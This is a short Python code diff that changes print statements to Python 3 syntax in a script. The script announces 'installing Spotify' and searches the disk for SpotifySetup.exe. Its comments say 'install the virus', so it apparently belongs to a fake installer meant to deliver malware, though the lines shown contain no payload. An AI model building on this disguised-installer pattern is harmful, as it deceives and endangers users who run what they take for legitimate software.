@@ -1,7 +1,7 @@
 import os
 from subprocess import check_output
 
-print "installing Spotify"
+print ("installing Spotify")
 
 #install the virus
 #open the exe file of skype installation
@@ -9,7 +9,7 @@ print "installing Spotify"
 
 #find the path of skype exe in this computer
 spotify_exe_path=check_output("cd/ & dir /b /s SpotifySetup.exe", shell=True)
-print spotify_exe_path
+print (spotify_exe_path)
 spotify_exe_path=spotify_exe_path.splitlines()[0]
 
 #get the current path
